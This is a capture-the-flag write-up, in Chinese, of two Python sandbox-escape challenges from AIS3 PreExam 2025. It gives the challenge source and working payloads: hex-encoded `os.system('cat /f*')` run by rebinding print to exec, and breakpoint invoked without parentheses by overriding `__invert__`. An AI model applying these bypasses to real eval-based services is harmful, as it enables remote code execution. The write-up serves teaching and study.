# AIS3 PreExam 2025

這次在 AIS3 PreExam 出了兩題 Pyjail，原本想要出 Web 的，但被太晚填表單了ＸＤ

## nocall 

(5 solve/389)

題目如下：
```python
#!/usr/local/bin/python3
import unicodedata

print(open(__file__).read())

expr = unicodedata.normalize("NFKC", input("> "))

if "._" in expr:
    raise NameError("no __ %r" % expr)

if "breakpoint" in expr:
    raise NameError("no breakpoint %r" % expr)

if any([x in "([ ])" for x in expr]):
    raise NameError("no ([ ]) %r" % expr)

# baby version: response for free OUO
result = eval(expr)
print(result)
```

題目會先進行 normalize，所以 unicode 繞 string check 用不了，然後有幾個 string check:
1. 字串內不能出現 `._`
2. 字串內不能出現 `breakpoint` 
3. 字串內不能出現 `(` `[` `]` `)` ` `

然後字串會拿去 eval 之後把結果 print 出來，並且透過觀看 `Dockerfile` 可以知道目標是 RCE。


可以發現 eval 是沒有特別指定 local 跟 global 的，代表他可以碰到外面的 context，理想下流程：
所以如果我們能把 `__builtins__` 中的 `print` 改為 `exec` 或者 `system`。然後直觀可以想到 hex string 的方式繞掉字串檢查，只要控制 eval 的回傳值為惡意字串，就可以讓後續被蓋掉的 print 跑起來惡意字串。

大概是要做到如下的事情：
```python
print=exec
# __import__("os").system("cat /f*")
return "\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f\x28\x22\x6f\x73\x22\x29\x2e\x73\x79\x73\x74\x65\x6d\x28\x22\x63\x61\x74\x20\x2f\x66\x2a\x22\x29"
```

但是我們是 eval，只能給 expression，所以可以用海象表達式：

```
{print:=exec}
```

至於要讓回傳值是可控字串可以：
（後面的 `"""` 是為了讓 `{print:=exec}.__doc__` 產生的垃圾不會影響 exec）

```
"\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f\x28\x22\x6f\x73\x22\x29\x2e\x73\x79\x73\x74\x65\x6d\x28\x22\x63\x61\x74\x20\x2f\x66\x2a\x22\x29"+'\n"""'+{print:=exec}.__doc__+'"""'
```

另外 `._` 會被字串檢查到，但我們能用 `.\t_` 繞。

## nocall-revenge 

(1 solve/389)

```python
#!/usr/local/bin/python3
import unicodedata

print(open(__file__).read())

expr = unicodedata.normalize("NFKC", input("> "))

if "._" in expr:
    raise NameError("no __ %r" % expr)

if any([x in "(['\"+-*/ ])" for x in expr]):
    raise NameError("no (['\"+-*/ ]) %r" % expr)

# no response for you :>
eval(expr)
```

比起 nocall，多 ban 了一些字元，eval 後沒有東西，但沒 ban breakpoint，應該目標蠻明顯的吧（Ｘ

想辦法呼叫 breakpoint 就可以了，但這題沒有 `(` `)` 應該不能呼叫了？

應該有人有聽過可以透過 decorator 來不透過括號來呼叫，但這題是用 eval，造不出 decorator。

核心想法就是把 python 裡面的預設行為蓋掉，然後再觸發就可以成功呼叫。

例如：
```python
class foo:
    pass
foo.__neg__ = breakpoint
```

然後我們再 `-foo()` 就會成功呼叫 breakpoint。所以我們拿裡面一個內建的 class 然後把它預設運算子行為蓋成 breakpoint 就可以了，但我這邊把 `+-*/` 都禁掉了，不過 Python [可不只這些運算](https://docs.python.org/3/reference/datamodel.html#emulating-numeric-types)，隨便拿一個蓋就可以了。

但很可惜，海象運算子的 lfs 不支援複雜表達，也就是不能：
```python
{foo.__invert__:=breakpoint}
```

這也是這一題的考點之一：“如何在 expression 中蓋掉一層以上的成員”

可以透過 for loop 來達到，像是:
```python
{{0for\thelp.\t__class__.\t__invert__\tin{breakpoint}}
```

這樣就可以把 `help.__class__.__invert__` 蓋成 breakpoint，最後只要 `~help` 即可成功開 breakpoint shell 來 RCE。
